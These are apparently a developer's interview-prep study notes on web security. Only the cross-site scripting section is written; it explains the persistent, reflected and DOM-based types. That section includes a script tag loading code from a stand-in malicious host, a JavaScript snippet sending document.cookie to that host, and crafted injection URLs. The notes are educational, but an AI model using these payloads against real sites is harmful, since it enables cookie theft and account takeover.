When I was in an interview of Tencent, the interviewer asked me how much Web security questions you know?

I found I don't have a systemic knowledge network of it.

So, there are some points I collected for memory.

## CSRF



## cookie



## XSS

It is Cross Site Script. But its abbreviation is CSS, which is the same as Cascading 
Style Sheets. SO....it becomes XSS. 

XSS is a code injection attack that allows an attacker to execute malicious 
JavaScript in another user's browser.

It includes these 3 types:

### Persistent XSS

Normally happened in those websites users can post their input. The malicious code will be saved in 
the database, therefore, each user who opened the page will be attacked.

For example, if there is a input tag, user can post their own content by it. Other users can open this page see 
the content.

```html
<!--the content in this tag will be post to database-->
<input type="text"> 

<!--if a user input "Users content", other user can see as below-->
<p>Users content</p>
```

But, if someone input a string as below:
`<script src="http://www.malicious-site.com/code"></script>`

the final result may as:

```html
<p><script src="http://www.malicious-site.com/code"></script></p>
```

And the script like as below:

```js
var img = document.createElement('img');
img.src = 'http://www.malicious-site.com/save-cookie?cookie=' + document.cookie;
document.body.appendChild(img);
```

In this way, the malicious site can get the cookie of each user who open the page.

To prevent it, I think the best way is to filter users' post content.

### Reflected XSS

Its principle is the same as Persistent XSS, attacker try to get user's personal information 
by insert HTML tag.

For example, there is a error page who shows error messages from the server by url, like 
`http://www.some-page.com/error?message=Page%20not%20found`, the content in `message` will be showed in 
HTML, like:

```html
<p>Page not found</p>
```

If an attack inputs an URL like `http://www.some-page.com/error?message=<script src="http://www.malicious-site.com/code"></script>`,
The final HTML will become:

```html
<p><script src="http://www.malicious-site.com/code"></script></p>
```

Next processes will be the same as Persistent XSS.

### DOM-based XSS

According to some of articles on the Internet, Dom-based XSS is a special Reflected XSS.

In my understanding, DOM-based XSS triggers attack via modifying DOM content, such as 
`innerHTML`, which is the same as Reflected XSS. 

But, their difference is that Dom-based XSS won't leave a mark in the server side, compared to Reflected XSS
which will leave a url record in the server request log.

There is a simple example updated from last example of Reflected XSS:

we can use a new url like:`http://www.some-page.com/error?message=Page%20not%20found#%3Cscript%20src%3D%22http%3A%2F%2Fwww.malicious-site.com%2Fcode%22%3E%3C%2Fscript%3E`.

The biggest difference is that we can use `location.hash` to inject malicious code to the page, which won't show the url after `#` in the 
server side. In this way, it is more difficult for website maintainers to find the attack by checking request log.

So the biggest difference among Reflected XSS and DOM-based XSS is that DOM-based XSS cannot be found in the server side, it is 
pure attack happened on client side.

### How to prevent XSS

I think the best way to prevent XSS is to forbid users to change HTML content, but this is difficult especially for those websites 
based on UGC. 

So, the feasible way is to filter url's parameters and UGC, such as some of special chars, `<>\/*;'`.

There are some alternative chars to replace sensitive chars in JS, such as `\u003c` and `\x3c` to replace `<`, and `\u003e` and `\x3e` to 
replace `>`.

## SQL Injection



## Command Injection



## DDoS attack



## Traffic hijacking